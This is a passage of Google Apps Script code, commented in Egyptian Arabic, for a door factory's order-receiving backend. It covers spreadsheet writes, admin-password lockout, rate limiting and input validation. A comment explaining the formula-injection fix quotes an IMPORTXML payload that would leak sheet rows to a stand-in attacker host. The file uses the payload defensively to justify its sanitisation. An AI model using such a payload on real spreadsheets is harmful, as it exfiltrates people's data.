/**
 * ============================================================
 *  WPC Doors App — Order Receiver
 *  El-Korashy for UPVC Doors & Windows
 * ============================================================
 *
 *  السكريبت ده مربوط بشيت WPC_Door_Orders_2026.
 *  بيستقبل الطلبات من التطبيق وبيكتبها بالإنجليزي في تبويبين:
 *    Orders       : سطر واحد لكل طلب (الملخّص)
 *    Order_Items  : سطر لكل صنف جوه الطلب
 *
 *  التبويبات بتتعمل لوحدها أول ما يوصل أول طلب — مش محتاج تعملها بإيدك.
 *
 *  عمود Status في تبويب Orders بيتحدّد من شاشة «🔒 المصنع» جوه التطبيق
 *  (كلمة السر بتتظبط من Script Properties باسم ADMIN_PW — شوف adminPw_ تحت). القيم:
 *      New          → طلب جديد
 *      Received     → تم استلام الطلب
 *      In Progress  → تحت التنفيذ (دخل الإنتاج)
 *      Ready        → جاهز للتحميل
 *      Delivered    → تم التسليم
 *      Cancelled    → ملغي
 *  تقدر كمان تكتبها بإيدك في الشيت مباشرة.
 *  وعمود Note to Distributor لو كتبت فيه حاجة هتظهرله كمان.
 *
 *  ⚠️ ده سكريبت منفصل تمامًا عن سكريبت تطبيق الـ UPVC.
 *     متستخدمش نفس الرابط للاتنين عشان الطلبات ما تتخلطش.
 */

// أكواد بنود الخدمة على الباب — بتتحسب في الفلوس بس، مش في عدد القطع
// نسخة السكربت اللي على جوجل. التطبيق بيقراها في الـping ويقارنها بنسخته،
// وبيقول للمصنع لو السكربت المنشور قديم — الناس مش بتفتكر عملت
// Deploy ▸ New version ولا لأ، وده أوحش نوع مشكلة: التطبيق شغّال والسيرفر
// ناقص حاجة. **لازم** تزوّد الرقم ده كل مرة السكربت ده يتغيّر.
var SRV_BUILD_ = 'v294r3';

var CUT_SERVICE_CODE_ = 'CUT';
var WOOD_SERVICE_CODE_ = 'WOOD';
var PRINT_SERVICE_CODE_ = 'PRINT';
function isServiceCode_(code){
  var c = String(code || '');
  return c === CUT_SERVICE_CODE_ || c === WOOD_SERVICE_CODE_ || c === PRINT_SERVICE_CODE_;
}
/* ⚠️ الباب A015 اتغيّر كوده لـA013. الشيت لسه فيه صفوف قديمة مكتوب فيها
   A015 (أصناف طلبات + صف رصيد في المخزن). من غير تطبيع، الرصيد بيتقسم نصين:
   صف قديم على A015 وصف جديد على A013 — والخصم بيروح على واحد والبيع من
   التاني، فالمصنع يبيع أبواب مش موجودة. بنعتبرهم كود واحد في كل مقارنة. */
var DOOR_CODE_ALIASES_ = { 'A015': 'A013' };
function doorCode_(c){
  var k = String(c == null ? '' : c).trim();
  return DOOR_CODE_ALIASES_[k] || k;
}
var DOOR_STD_HEIGHT_ = 215;   // الارتفاع الاستاندر — أي ارتفاع غيره معناه قص
var SHEET_ORDERS = 'Orders';
var SHEET_ITEMS  = 'Order_Items';
var SHEET_ERRORS = 'Errors';
var SHEET_STOCK  = 'Stock';        // أرصدة المخزن الجاهزة للتسليم خلال ٤٨ ساعة
var SHEET_PRICES = 'Prices';       // أسعار الكتالوج — مصدر واحد لكل الأجهزة
var HEAD_PRICES  = ['Prices JSON', 'Updated At'];

var HEAD_STOCK = ['Code', 'Size', 'Qty', 'Updated'];
var COL_STOCK_QTY     = 3;
var COL_STOCK_UPDATED = 4;
var TZ           = 'Africa/Cairo';

// الحالات المسموحة — أي حاجة غيرها بتترفض.
// ⚠️ قبل كده كانت e.parameter.status بتتكتب في الشيت زي ما هي من غير أي تحقق.
// يعني طلب فيه غلطة إملائية أو نداء متعمّد كان يقدر يكتب أي نص في عمود الحالة،
// وساعتها التطبيق مش هيعرف الحالة دي: البادج بيطلع بالنص الخام، وقفل التعديل
// (LOCKED_EDIT_STATUSES) مش هيشتغل، والأرشفة الأوتوماتيك عند «Delivered» مش
// هتحصل — فالطلب يفضل معلّق في حالة ملهاش معنى ومحدش واخد باله.
var VALID_STATUSES = ['New', 'Received', 'In Progress', 'Ready', 'Delivered', 'Cancelled'];
var ROD_LEN      = 2.20;   // الطول الافتراضي — الطول الفعلي بيجي مع كل صنف في it.rodCm
// ⚠️⚠️ كلمة سر شاشة المصنع مابقتش مكتوبة في الكود.
//
// السبب: الملف ده متسجّل في مستودع GitHub عام على الإنترنت — يعني أي حد يفتح
// الرابط كان يشوف كلمة السر مكتوبة صريحة. مافيش تعقيد في كلمة السر بيحمي من ده.
//
// دلوقتي بتتقري من Script Properties (إعدادات المشروع في Apps Script نفسه،
// مش بتتحفظ في أي ملف ولا بتترفع على GitHub).
//
// إزاي تظبطها (مرة واحدة بس):
//   ١) افتح محرر Apps Script بتاع المشروع
//   ٢) من الشمال: ⚙️ Project Settings
//   ٣) انزل لـ "Script Properties" → Add script property
//   ٤) Property = ADMIN_PW   |   Value = كلمة السر اللي تختارها
//   ٥) Save، وبعدين Deploy → New deployment
//
// لو ما ظبطتهاش، شاشة المصنع هترفض الدخول وهتقول لك تظبطها — بدل ما تشتغل
// بكلمة سر معروفة للعالم كله.
function adminPw_() {
  var v = PropertiesService.getScriptProperties().getProperty('ADMIN_PW');
  return v ? String(v) : '';
}

// ⚠️ أرقام أعمدة تبويب Orders (تبدأ من ١). لو زوّدت أو رتّبت الأعمدة
// في HEAD_ORDERS تحت، لازم تظبّط الأرقام دي معاها.
var COL_STATUS   = 11;   // Status
var COL_NOTE     = 12;   // Note to Distributor
var COL_UPDATED  = 15;   // Status Updated   // كلمة سر شاشة المصنع — غيّرها من هنا لو حبيت
var PRICE_NOTE   = 'الأسعار بعاليه حسب وقت التسعير وغير ملزمة إلا في حالة سداد المبلغ كامل أو نصفه.';

var HEAD_ORDERS = [
  'Order No', 'Date', 'Time', 'Distributor', 'Phone', 'Region',
  'Warehouse', 'Total Qty', 'Total Rods', 'Total Amount', 'Status', 'Note to Distributor', 'Pricing Terms', 'Message', 'Status Updated',
  'Archived', 'Customer', 'Order Note', 'Customer Phone', 'Superseded', 'Replaces Order', 'Display No', 'Edit Count', 'Edited At', 'Due Date',
  'Customer Region', 'Artwork Completed At', 'Artwork Purged At'
];
// ⚠️ الأعمدة دي كانت أرقام مكتوبة بالنص جوه الكود (getRange(r, 8)…).
// أول ما حد يزوّد عمود في نص الجدول، الكتابة كانت بتروح للخانة الغلط في
// صمت: «إجمالي الكمية» فوق «المخزن»، أو الكمية فوق «متاح؟». بقت مسمّاة
// هنا وtest/sheet-columns.mjs بيربط كل واحدة باسم عمودها.
// الأعمدة التلاتة اللي قراءة القايمة بتعدّيها (تقيلة ومحدش بيقراها من القايمة).
// الأسامي هي المصدر — أرقامها بتتحسب، فزيادة عمود قبلها مابتكسرش القراءة.
var GAP_COLS_ = ['Pricing Terms', 'Message', 'Status Updated'];
// مشتق من الأسامي نفسها — مش رقم مكتوب. لو الفجوة ماكانتش تلات أعمدة ورا
// بعض (حد زوّد عمود بينهم) بنرجع لقراءة الجدول كله: أبطأ، بس صح.
var GAP_FIRST_COL_ = (function () {
  var i = HEAD_ORDERS.indexOf(GAP_COLS_[0]);
  if (i < 0) return 0;
  for (var k = 1; k < GAP_COLS_.length; k++) {
    if (HEAD_ORDERS[i + k] !== GAP_COLS_[k]) return 0;   // مش ورا بعض
  }
  return i + 1;
})();

var COL_DATE       = 2;   // تاريخ الطلب
var COL_PHONE      = 5;   // تليفون الموزّع (صاحب الجهاز)
var COL_TOTAL_QTY  = 8;
var COL_TOTAL_RODS = 9;
var COL_TOTAL_AMT  = 10;

var COL_ARCHIVED = 16;
var COL_CUSTOMER = 17;   // اسم صاحب الأوردر لو مختلف عن صاحب الجهاز
var COL_ORDNOTE  = 18;   // ملاحظات العميل على الطلب   // Y/N — بيتحدّد أوتوماتيك لما الحالة تبقى Delivered، أو يدوي من زرار الأرشفة
var COL_CUST_PHONE = 19; // رقم تليفون صاحب الأوردر لو مختلف عن صاحب الجهاز
var COL_SUPERSEDED = 20; // علامة "الطلب ده اتعدّل وعنده نسخة جديدة" — بتتحط لما نقدرش نمسح الطلب القديم أوتوماتيك (لسه دخل التنفيذ)
var COL_REPLACES = 21;   // لو الطلب ده جه بدل تعديل طلب قديم، بيتحط هنا رقم الطلب القديم — عشان المصنع يعرف إنه تعديل مش طلب جديد مستقل
var COL_DISPLAY_NO = 22; // رقم الطلب "العادي" التسلسلي (1، 2، 3...) اللي بيبان للعميل/المصنع بدل كود الطلب الداخلي الطويل
var COL_EDIT_COUNT  = 23; // عدد مرات التعديل — بيتورّث من الطلب الأصلي وبيزيد ١ مع كل تعديل
var COL_EDITED_AT   = 24; // تاريخ آخر تعديل. الطلب المعدّل بياخد تاريخ الطلب الأصلي عن قصد،
                          // فتاريخ التعديل نفسه مكانش متسجّل في أي مكان. بيبان في المستند
                          // جنب الرقم المركّب: «52/1 — التعديل رقم 1 بتاريخ ...»
                          // العمود بيتضاف تلقائي لأي شيت قديم (شوف sheet_ تحت).

var COL_DUE = 25;          // ميعاد التسليم (yyyy-MM-dd). الافتراضي تاريخ الطلب + ١٤ يوم، والمصنع بيعدّله من شاشته.
var COL_ART_COMPLETED = 27;
var COL_ART_PURGED = 28;
var COL_CUST_REGION = 26;  // عنوان صاحب الأوردر لو «عميل آخر» — حقل مستقل زي Customer Phone. الطلبات القديمة فاضية.
                          // العمود بيتضاف تلقائي لأي شيت قديم (شوف sheet_ فوق) والطلبات القديمة بتفضل فاضية
                          // لحد ما المصنع يكتب ميعادها (التطبيق بيطلب منه ده أول ما يفتح شاشة المصنع).
var DUE_DEFAULT_DAYS_ = 14;

// يوم + ن بالتقويم الميلادي من غير أي تحويل توقيت (نفس درس باج setOrderMeta)
function addDaysIso_(iso, n) {
  var p = String(iso).split('-');
  var d = new Date(Date.UTC(Number(p[0]), Number(p[1]) - 1, Number(p[2]) + n));
  return Utilities.formatDate(d, 'UTC', 'yyyy-MM-dd');
}
// بيرجّع التاريخ لو شكله yyyy-MM-dd وصح، وإلا نص فاضي
function cleanIsoDate_(v) {
  var t = String(v == null ? '' : v).trim();
  if (!/^\d{4}-\d{2}-\d{2}$/.test(t)) return '';
  var p = t.split('-'), m = Number(p[1]), d = Number(p[2]);
  if (m < 1 || m > 12 || d < 1 || d > 31) return '';
  return t;
}

var HEAD_ITEMS = [
  'Order No', 'Date', 'Distributor', 'Type', 'Item', 'Colour Code',
  'Size', 'Included with Door', 'Milling', 'Unit', 'Qty', 'Unit Price', 'Line Total', 'Available',
  'Frame (cm)', 'Bror', 'Frame Height (cm)', 'Width (cm)', 'Produced Qty', 'Door Height (cm)',
  'For Door Width (cm)', 'Item Note', 'Print Image', 'Engraving Image', 'Received Qty'
];
var COL_ITEM_PRINTART = 23; // كود/رابط صورة الطباعة (للأبواب المطبوعة بس) — بيتملى من رفع الصورة في التطبيق
var COL_ITEM_RECEIVED = 25; // «المستلم» — اللي العميل استلمه فعلًا من الصنف (من صفر لحد الكمية). التقارير بتحسب على المتبقي = الكمية - المستلم

var COL_ITEM_QTY = 11;     // الكمية — ومعاها Unit Price وLine Total ورا بعض
                           // (بيتكتبوا التلاتة مرة واحدة، شوف syncItemQty_)
var COL_ITEM_WIDTH = 18;  // العرض بالسم كرقم خام (بس للأبواب) — بيتستخدم لخصم/رجوع رصيد المخزون بدقة
var COL_ITEM_AVAIL = 14;   // عمود "متاح؟" في تبويب Order_Items — Y/N، بيتحدّث من شاشة المصنع
var COL_ITEM_PRODUCED = 19; // عمود "الكمية المنتجة" — رقم من صفر لحد الكمية المطلوبة، بيتحدّث من شاشة المصنع
var COL_ITEM_DOORHEIGHT = 20; // ارتفاع الضلفة (سم) — اختياري، بس للأبواب المقاس القياسي (لو مختلف عن الاستاندر 210)
// عمودين جداد (v28) بيخزّنوا قيمة الحلق/البرور خام (منفصلين عن نص "Included with Door" الإنجليزي)
// عشان شاشة المصنع تقدر تعرضهم في عمودين منفصلين بالعربي بدل نص متلاصق واحد

/* ============================================================
   حماية كلمة سر المصنع من محاولات التخمين (brute force)
   بعد كل محاولة غلط بنستنى شوية قبل الرد (بتزيد كل مرة)، ولو المحاولات
   الغلط عدّت حد معيّن في ١٠ دقايق بنقفل الدخول تمامًا ١٥ دقيقة.
   ============================================================ */
// بتمنع Formula Injection: أي نص حر من العميل (اسم/ملاحظة) بيتكتب في الشيت،
// لو بيبدأ بـ = أو + أو - أو @ جوجل شيتس ممكن تفسّره كصيغة (formula) بدل نص عادي.
// بنحط علامة اقتباس (') قبله عشان يتخزن كنص حرفي زي ما هو، بالظبط زي ما بيحصل بالفعل لرقم الموبايل تحت.
// تنسيق تاريخ آمن. قبل كده كان الكود بينادي Utilities.formatDate(new Date(cell)) على طول،
// فأي صف فيه خانة تاريخ فاضية أو مكتوبة غلط بالإيد كان بيرمي استثناء يوقّع الرد كله —
// يعني شاشة المصنع وكل التقارير بتفضل فاضية بسبب صف واحد بايظ.
function fmtDate_(v) {
  try {
    if (v === '' || v === null || v === undefined) return '';
    var d = (v instanceof Date) ? v : new Date(v);
    if (isNaN(d.getTime())) return '';
    return Utilities.formatDate(d, TZ, 'yyyy-MM-dd');
  } catch (err) { return ''; }
}

// الكيبورد العربي بيكتب أرقام هندية (٠١٢٣٤٥٦٧٨٩). لو رقم موبايل اتسجّل كده،
// الشطر بـ /\D/g كان بيمسحه بالكامل (لأنها مش أرقام لاتينية) فيفضل فاضي —
// والموزع ده مايلاقيش طلباته أبدًا ولا يقدر يلغي طلب.
// بنحوّلها للاتينية الأول، فالسجلات القديمة بترجع تشتغل من غير ما نلمس الشيت.
function digitsOnly_(v) {
  return String(v == null ? '' : v)
    .replace(/[\u0660-\u0669]/g, function (d) { return String(d.charCodeAt(0) - 0x0660); })
    .replace(/[\u06F0-\u06F9]/g, function (d) { return String(d.charCodeAt(0) - 0x06F0); })
    .replace(/\D/g, '');
}

function sanitizeCell_(s) {
  s = String(s == null ? '' : s);
  // بنضيف \t و\r كمان: جوجل شيت بيتجاهل المسافات في أول الخانة، فـ "\t=CMD" لسه
  // بيتقري كصيغة. الشرط القديم كان بيفوّتها.
  if (/^[\s]*[=+\-@\t\r]/.test(s)) return "'" + s;
  return s;
}

// ⚠️ ثغرة كانت هنا: تنظيف الصيغ (sanitizeCell_) كان متطبّق على 4 حقول بس
// (الاسم، صاحب الأوردر، ملاحظات العميل، ملاحظة الصنف). باقي الحقول اللي الموزع
// بيكتبها بإيده — «المنطقة»، ونص الرسالة، وتليفون صاحب الأوردر، واسم الصنف والكود
// والمقاس — كانت بتتكتب في الشيت زي ما هي.
// و endpoint الـ newOrder مفتوح من غير كلمة سر (لازم يفضل كده عشان الموزعين
// يقدروا يبعتوا)، يعني أي حد يقدر يبعت طلب فيه صيغة زي:
//     =IMPORTXML("https://evil.example/?d="&A1&B1, "//x")
// وأول ما موظف المصنع يفتح الشيت، جوجل بينفّذ الصيغة ويسرّب بيانات الصفوف لسيرفر بره.
// الحل: ننظّف الصف كله — كل خانة نصية بتعدّي على sanitizeCell_، والأرقام والتواريخ
// بتفضل زي ما هي عشان الجمع والترتيب في الشيت ما يتكسرش.
function sanitizeRow_(row) {
  return row.map(function (v) {
    return (typeof v === 'string') ? sanitizeCell_(v) : v;
  });
}

// بيرجّع رقم الطلب "العادي" التسلسلي الجاي (1، 2، 3...) — بيتخزن في Script Properties وبيتزوّد بأمان.
// ملحوظة: من غير قفل هنا عمدًا — اللي بينادي الدالة دي (doPost / doGet لأكشن newOrder) ماسك
// LockService.getScriptLock() أصلًا على العملية كلها، فقفل تاني جوّه كان ممكن يعمل قفل مزدوج.
// أول مرة (لو مفيش رقم متخزّن قبل كده) بيبدأ من عدد الطلبات الموجودة فعلاً في الشيت عشان الترقيم يكمل من عندهم مش يرجع لـ١.
function nextOrderDisplayNo_(sh) {
  var props = PropertiesService.getScriptProperties();
  var cur = props.getProperty('ORDER_DISPLAY_NO_SEQ');
  if (cur === null) {
    // ⚠️ كان بياخد أول رقم من عدد صفوف الشيت (last - 1). لكن تعديل الطلب بيمسح
    // صف الطلب القديم، فعدد الصفوف دايمًا أقل من أكبر رقم اتصرف فعلاً. يعني لو
    // العدّاد اتصفّر (نسخة جديدة من السكريبت أو مسح خصائصه) الترقيم كان بيرجع
    // لورا وطلبين مختلفين ياخدوا نفس الرقم. بنقرا أكبر رقم موجود بجد بدل كده.
    cur = String(maxOrderDisplayNo_(sh));
  }
  var next = Number(cur) + 1;
  props.setProperty('ORDER_DISPLAY_NO_SEQ', String(next));
  return next;
}

// أكبر رقم طلب متصرّف فعلاً في الشيت. بتتنادى مرة واحدة بس (أول مرة يتظبط
// فيها العدّاد)، فقراية العمود كله هنا مش بتكلّف حاجة على الطلبات العادية.
function maxOrderDisplayNo_(sh) {
  var last = sh.getLastRow();
  if (last < 2) return 0;
  var vals = sh.getRange(2, COL_DISPLAY_NO, last - 1, 1).getValues();
  var mx = 0;
  for (var i = 0; i < vals.length; i++) {
    var n = Number(vals[i][0]);
    if (isFinite(n) && n > mx) mx = n;
  }
  return mx;
}

// ⚠️ المشكلة اللي كانت في النسخة القديمة: العدّاد والقفل كانوا عامّين على السكريبت
// كله. يعني أي حد يعمل ١٥ محاولة غلط كان بيقفل شاشة المصنع على الموظفين كلهم ١٥
// دقيقة — هجمة تعطيل بسيطة جدًا وبتتكرر على طول.
//
// النظام الجديد بطبقتين:
//   • طبقة الجهاز: ٥ محاولات غلط من نفس الجهاز → الجهاز ده يتقفل ١٥ دقيقة.
//     المهاجم بيتقفل، والموظف على جهازه مش متأثر خالص.
//   • طبقة عامة: مافيش قفل نهائي أبدًا — بس تأخير بيكبر مع عدد المحاولات الغلط
//     (لحد ٨ ثواني). يعني التخمين بيبقى بطيء جدًا، والموظف اللي بيكتب كلمة السر
//     الصح بيدخل على طول من غير ما يستنى.
// النتيجة: التخمين أصعب من الأول، ومافيش طريقة تقفل الشاشة على المصنع.
function checkAdminPw_(pw, devId) {
  var cache = CacheService.getScriptCache();
  var pwReal = adminPw_();

  // كلمة السر مش متظبّطة في Script Properties — بلّغ بوضوح بدل ما تقبل أي حاجة
  if (!pwReal) return false;

  var dev = String(devId || '').replace(/[^A-Za-z0-9_-]/g, '').slice(0, 40) || 'nodev';
  var devFailKey = 'adm_f_' + dev;
  var devLockKey = 'adm_l_' + dev;
  var globFailKey = 'adm_fail_count';

  // الجهاز ده مقفول؟
  var lockedUntil = Number(cache.get(devLockKey) || 0);
  if (lockedUntil && Date.now() < lockedUntil) return false;

  if (String(pw || '') === pwReal) {
    cache.remove(devFailKey);
    cache.remove(devLockKey);
    return true;
  }

  // فشل: زوّد العدّادين
  var devFails = Number(cache.get(devFailKey) || 0) + 1;
  cache.put(devFailKey, String(devFails), 900);              // نافذة ١٥ دقيقة للجهاز
  if (devFails >= 5) {
    cache.put(devLockKey, String(Date.now() + 15 * 60000), 1200);   // اقفل الجهاز ده بس
  }

  var globFails = Number(cache.get(globFailKey) || 0) + 1;
  cache.put(globFailKey, String(globFails), 600);            // نافذة ١٠ دقايق عامة
  // تأخير عام بيكبر مع المحاولات — بيبطّأ التخمين من غير ما يقفل على حد
  Utilities.sleep(Math.min(globFails * 400, 8000));
  return false;
}

// مقارنة صامتة بكلمة السر — من غير عدّادات ولا تأخير.
// بتتستخدم بس في المسارات اللي المستخدم العادي بيعدي منها كمان (زي «تابع طلبك»
// وإلغاء الطلب برقم الموبايل)، عشان مانعاقبش الموزع العادي بتأخير 8 ثواني
// وإحنا أصلًا مش بنطلب منه كلمة سر. لو مفيش كلمة سر مبعوتة بترجّع false على طول.
function isAdminPwQuiet_(pw) {
  var real = adminPw_();
  return !!(real && String(pw || '') === real);
}

// بيرجّع رسالة الخطأ المناسبة لشاشة المصنع
function adminPwError_() {
  if (!adminPw_()) {
    return 'كلمة سر المصنع مش متظبّطة على السيرفر — افتح Apps Script → Project Settings → Script Properties وضيف ADMIN_PW';
  }
  return 'كلمة السر غلط';
}

/* ============================================================
   حدود الاستخدام (حماية من العبث)
   ============================================================
   المسارات دي مفتوحة من غير كلمة سر عن قصد — الموزّع لازم يقدر يبعت طلب
   ويتابعه من غير ما يحفظ كلمة سر. بس ده معناه إن أي حد معاه الرابط يقدر:
     • يغرق الشيت بطلبات وهمية
     • يجرّب أرقام موبايل واحد ورا التاني لحد ما يلاقي طلبات ويلغيها
   الحدود دي بتخلّي العبث ده غير عملي، وواسعة كفاية إن الاستخدام الحقيقي
   (حتى لو الموزّع بعت عشر طلبات ورا بعض، أو طابور الانتظار فضّى نفسه)
   عمره ما يوصلها.
   ============================================================ */
var RATE_LIMITS_ = {
  uploadPrint: {limit:40,window:600},
  printRead: {limit:240,window:600},
  newOrder:    { limit: 40,  window: 600 },   // ٤٠ طلب في ١٠ دقايق للجهاز
  listPhone:   { limit: 120, window: 600 },   // ١٢٠ استعلام في ١٠ دقايق
  cancelOrder: { limit: 20,  window: 600 }    // ٢٠ إلغاء في ١٠ دقايق
};

// معرّف الجهاز اللي التطبيق بيبعته. لو مش موجود بنستعمل دلو مشترك بحد أوسع
// عشان ما نقفلش على ناس بسبب نسخة قديمة من التطبيق مش بتبعت المعرّف.
function rateKey_(kind, devId) {
  var dev = String(devId || '').replace(/[^A-Za-z0-9_-]/g, '').slice(0, 40);
  return 'rl_' + kind + '_' + (dev || 'shared');
}

// بترجّع true لو مسموح، false لو الجهاز عدّى الحد.
function rateOk_(kind, devId) {
  try {
    var conf = RATE_LIMITS_[kind];
    if (!conf) return true;
    var dev = String(devId || '').replace(/[^A-Za-z0-9_-]/g, '').slice(0, 40);
    var limit = dev ? conf.limit : conf.limit * 5;   // الدلو المشترك أوسع
    var cache = CacheService.getScriptCache();
    var key = rateKey_(kind, devId);
    var n = Number(cache.get(key) || 0) + 1;
    cache.put(key, String(n), conf.window);
    return n <= limit;
  } catch (e) { return true; }   // الكاش مش متاح؟ ما نوقفش الشغل
}

var RATE_MSG_ = 'محاولات كتير في وقت قصير — استنى شوية وجرّب تاني';

// فحص شكل الطلب قبل ما يتكتب في الشيت. الهدف: طلب مشوّه أو ضخم مايبوّظش
// الشيت ولا ياكل وقت التنفيذ.
var MAX_ITEMS_ = 300;          // أكبر طلب حقيقي عندنا كان ١٥ صنف
var MAX_TEXT_  = 500;          // أطول نص معقول في أي خانة
function orderShapeError_(o) {
  if (!o || typeof o !== 'object') return 'بيانات الطلب مش مقروءة';
  if (!o.id || String(o.id).length > 60) return 'كود الطلب مش صحيح';
  var items = o.items;
  if (!items || !items.length) return 'الطلب مفيهوش أصناف';
  if (items.length > MAX_ITEMS_) return 'عدد الأصناف أكبر من المسموح';
  var fields = ['name', 'phone', 'region', 'customer', 'note', 'customerPhone', 'customerRegion'];
  for (var i = 0; i < fields.length; i++) {
    var v = o[fields[i]];
    if (v != null && String(v).length > MAX_TEXT_) return 'حقل «' + fields[i] + '» أطول من المسموح';
  }
  try{validateOrderArtwork_(o);}catch(eArt){return eArt.message||'مرفق التصميم غير مكتمل';}
  return '';
}

/* ============================================================
   استقبال الطلب من التطبيق
   ============================================================ */
function doPost(e) {
  try{var routed=JSON.parse(e.postData.contents);if(routed.action==='factoryArtStage294')return json(handleFactoryArtStage294_(routed));if(routed.action==='createOrder294'||routed.action==='createReceipt294')return json(handleAtomicCreate294_(routed));}catch(routeError){return json({ok:false,error:String(routeError.message||routeError)});}

  var lock = LockService.getScriptLock();
  try {
    // القفل بيمنع إن طلبين يوصلوا في نفس اللحظة ويكتبوا فوق بعض
    lock.waitLock(20000);

    var body = JSON.parse(e.postData.contents);

    // رفع صورة الطباعة — بتتخزّن في جوجل درايف وبيرجع كودها، والتطبيق بيحط الكود في صنف الباب
    if(body.action==='uploadPrint'){
      if(!rateOk_('uploadPrint',body.dev))return json({ok:false,error:RATE_MSG_});
      return json(uploadPrintPrivate_(body));
    }
    if (body.action !== 'newOrder' || !body.order) {
      return json({ ok: false, error: 'Unknown action' });
    }
    assertLegacySubmission294_(body.order.id);
    if (!rateOk_('newOrder', body.dev)) return json({ ok: false, error: RATE_MSG_ });
    var shapeErr = orderShapeError_(body.order);
    // permanent = مفيش فايدة من إعادة المحاولة، شكل الطلب نفسه غلط.
    // (بعكس حد الاستخدام أو انقطاع النت — دول بيتصلّحوا بالمحاولة تاني)
    if (shapeErr) return json({ ok: false, error: shapeErr, permanent: true });

    var saved = saveOrder_(body.order);
    return json({ ok: true, id: body.order.id, displayNo: saved.displayNo, editCount: saved.editCount });

  } catch (err) {
    logError_(err);
    return json({ ok: false, error: String(err) });
  } finally {
    try { lock.releaseLock(); } catch (e2) {}
  }
}

/* ============================================================
   قراءة الطلبات (للاستخدام لاحقًا لو حبيت التطبيق يعرضها)
   ============================================================ */
function doGet(e) {
  var cb = (e && e.parameter && e.parameter.callback) || '';
  try {
    var action = (e && e.parameter && e.parameter.action) || 'ping';

    if(action==='factoryEditSnapshot294'||action==='factoryEditCommit294'||action==='factoryEditReceipt294')return reply(handleFactoryEdit294_(e),cb);
    if(action==='factoryCutQuote294')return reply(handleCutQuote294_(e),cb);
    if(action==='factoryArtStatus294')return reply(handleFactoryArtStatus294_(e.parameter),cb);
    if(action==='createOrder294'||action==='createReceipt294')return reply(handleAtomicCreate294_(e.parameter),cb);
    if (action === 'ping') {
      return reply({ ok: true, msg: 'WPC orders script is running', srv: SRV_BUILD_, capabilities:{atomicCreate294:PropertiesService.getScriptProperties().getProperty('ATOMIC_CREATE_294_ENABLED')==='REVIEWED',customerRegionV1:true,privateArtworkV1:true,engravingArtworkV1:true,artworkRetentionV1:PropertiesService.getScriptProperties().getProperty('ART_RETENTION_POLICY')==='READY_72H_PERMANENT_V1'} }, cb);
    }

    if(action==='printStatus'||action==='printRead'){
      if(!rateOk_('printRead',e.parameter.dev))return reply({ok:false,error:RATE_MSG_},cb);
      try{return reply(handlePrivateArt_(action,e.parameter),cb);}catch(eArt){return reply({ok:false,error:'تعذّر قراءة التصميم بشكل آمن'},cb);}
    }
    // إضافة طلب جديد عبر GET (JSONP) — بديل مضمون الرد لطلب POST العادي،
    // عشان التطبيق يقدر يتأكد فعليًا إن الطلب وصل قبل ما يقول للموزع "تم الإرسال".
    if (action === 'newOrder') {
      var lockNO = LockService.getScriptLock();
      try {
        lockNO.waitLock(20000);
        var orderNO = JSON.parse(String(e.parameter.payload || '{}'));
        assertLegacySubmission294_(orderNO.id);
        if (!rateOk_('newOrder', e.parameter.dev)) return reply({ ok: false, error: RATE_MSG_ }, cb);
        var shapeErrNO = orderShapeError_(orderNO);
        if (shapeErrNO) return reply({ ok: false, error: shapeErrNO, permanent: true }, cb);
        var savedNO = saveOrder_(orderNO);
        return reply({ ok: true, id: orderNO.id, displayNo: savedNO.displayNo, editCount: savedNO.editCount }, cb);
      } catch (errNO) {
        logError_(errNO);
        return reply({ ok: false, error: String(errNO) }, cb);
      } finally {
        try { lockNO.releaseLock(); } catch (eNO) {}
      }
    }

    // تحديث حالة الطلب — من شاشة المصنع
    if (action === 'setStatus') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lock = LockService.getScriptLock();
      try {
        lock.waitLock(15000);
        var shS = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var r = findRow_(shS, e.parameter.id);
        if (r < 0) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        var newStatus = String(e.parameter.status || '');
        if (VALID_STATUSES.indexOf(newStatus) < 0) {
          return reply({ ok: false, error: 'حالة غير معروفة: ' + newStatus }, cb);
        }
        // ⚠️ الإلغاء عن طريق cancelOrder/deleteOrder كان بيرجّع الرصيد، لكن تغيير
        // الحالة لـ Cancelled من هنا مكانش بيرجّعه — فالرصيد يفضل مخصوم لطلب
        // ملغي. بنمشي على نفس القاعدة: الملغي بيرجّع رصيده، والراجع من الإلغاء
        // لحالة نشطة بيتخصم تاني. المُسلَّم فعليًا مالوش رصيد يرجع.
        var oldStatus = String(shS.getRange(r, COL_STATUS).getValue() || '');
        if (newStatus !== oldStatus) {
          if (newStatus === 'Cancelled' && oldStatus !== 'Delivered') {
            adjustStockForOrderId_(e.parameter.id, +1);
          } else if (oldStatus === 'Cancelled' && newStatus !== 'Cancelled') {
            adjustStockForOrderId_(e.parameter.id, -1);
          }
        }
        artStatusTransition_(shS,r,String(e.parameter.id),oldStatus,newStatus,true);
        shS.getRange(r, COL_STATUS).setValue(newStatus);
        artStatusTransition_(shS,r,String(e.parameter.id),oldStatus,newStatus);
        shS.getRange(r, COL_UPDATED).setValue(new Date());
        var archivedNow = false;
        if (newStatus === 'Delivered') {          // تسليم الطلب = أرشفة أوتوماتيك
          shS.getRange(r, COL_ARCHIVED).setValue('Y');
          archivedNow = true;
        }
        return reply({ ok: true, id: e.parameter.id, status: newStatus, archived: archivedNow }, cb);
      } finally {
        try { lock.releaseLock(); } catch (e2) {}
      }
    }

    // أرشفة/إرجاع طلب يدويًا (📦 أرشفة أو ↩️ رجّع من الأرشيف)
    if (action === 'archiveOrder') {
      if (!checkAdminPw_(e.parameter.pw, e.parameter.dev)) {
        return reply({ ok: false, error: adminPwError_() }, cb);
      }
      var lockAR = LockService.getScriptLock();
      try {
        lockAR.waitLock(15000);
        var shAR = sheet_(SHEET_ORDERS, HEAD_ORDERS);
        var rAR = findRow_(shAR, e.parameter.id);
        if (rAR < 0) return reply({ ok: false, error: 'الطلب مش موجود' }, cb);
        shAR.getRange(rAR, COL_ARCHIVED).setValue(String(e.parameter.archived) === '1' ? 'Y' : 'N');
        if (String(e.parameter.archived) === '1') shAR.getRange(rAR, COL_UPDATED).setValue(new Date());   // يوم الأرشفة اليدوية
        return reply({ ok: true, id: e.parameter.id }, cb);
      } finally {
        try { lockAR.releaseLock(); } catch (eAR) {}
      }
    }

    if (action === 'list') {
      var isAdmin;
      if (e.parameter.phone) {
        // مستخدم عادي بيجيب طلباته هو برقم موبايله — مفيش كلمة سر، بس فيه حد
